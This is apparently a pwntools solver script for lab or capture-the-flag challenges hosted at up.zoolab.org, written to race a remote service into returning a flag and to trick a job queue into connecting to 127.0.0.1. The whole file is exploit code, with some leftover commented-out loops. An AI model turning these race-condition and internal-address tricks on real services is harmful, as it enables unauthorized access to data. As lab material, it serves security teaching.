from pwn import remote


def solve_challenge_1(r: remote):
    msg = r.recvline().decode()
    print(msg)

    while True:
        r.sendline(b"R")
        r.sendline(b"flag")

        msg = r.recvline().decode()
        if msg.startswith("F> FLAG"):
            print(msg)
            break

    r.close()


def check_jobs(r: remote):
    r.sendline(b"v")
    msg = r.recvuntil(b"==== Menu ====").decode()
    r.recvuntil(b"What do you want to do?")
    return msg


def solve_challenge_2(r: remote):
    msg = r.recvuntil(b"What do you want to do?").decode()
    print(msg)

    for _ in range(30):
        r.sendline(b"g")
        r.sendline(b"127.0.0.2/10000")
        r.recvuntil(b"What do you want to do?")
    r.sendline(b"g")
    r.sendline(b"127.0.0.1/10000")
    r.recvuntil(b"What do you want to do?")

    #     msg = check_jobs(r)
    #     if "flag" in msg.lower():
    #         print(msg)
    #         break

    # while True:
    #     msg = check_jobs(r)
    #     if "flag" in msg.lower():
    #         print(msg)
    #         break
    #     # print(msg)

    # while True:
    #     r.sendline(b"v")
    #     msg = r.recvuntil(b'==== Menu ====').decode()
    #     # if "flag" in msg.lower():
    #     #     print(msg)
    #     #     break
    #     print(msg)
    #     r.recvuntil(b'What do you want to do?')
    r.interactive()
    r.close()


def solve_challenge_3(r: remote):
    msg = r.recvline().decode()
    print(msg)

    while True:
        r.sendline(b"R")
        r.sendline(b"flag")

        msg = r.recvline().decode()
        if msg.startswith("F> FLAG"):
            print(msg)
            break

    r.close()


REMOTE_SOLVERS = {
    10931: solve_challenge_1,
    10932: solve_challenge_2,
    10933: solve_challenge_3,
}

if __name__ == "__main__":
    # if len(sys.argv) > 1:
    #     port = int(sys.argv[1])
    # else:
    #     port

    ## for remote access
    r = remote("up.zoolab.org", 10932)
    solve_challenge_2(r)
